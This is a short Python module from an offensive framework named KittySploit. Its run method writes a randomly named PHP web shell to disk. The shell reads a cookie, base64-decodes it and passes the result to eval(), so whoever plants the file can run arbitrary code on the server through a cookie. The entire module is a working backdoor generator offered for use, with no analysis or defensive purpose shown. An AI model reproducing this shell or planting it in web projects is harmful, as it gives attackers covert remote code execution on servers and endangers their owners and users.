from kittysploit import *

class Module(Backdoor):
	
	__info__ = {
		'name': 'Shell Php cookie',
		'description': 'Shell Php cookie',
		'author': 'KittySploit Team',
		'listener': 'listeners/web/php_cookie',
		'session_type': SessionType.PHP,
		'arch': Arch.PHP,
	}

	cookie_name = OptString("kitty_shell", "Cookie name for shell", True)

	def run(self):
		
		filename = self.random_text(8)+".php"
		data = f"""<?php
$data = $_COOKIE['{self.cookie_name}'];
echo eval(base64_decode($data));
?>
"""
		self.write_out_dir(filename, data)
		print_success(f"Filename : {filename}")
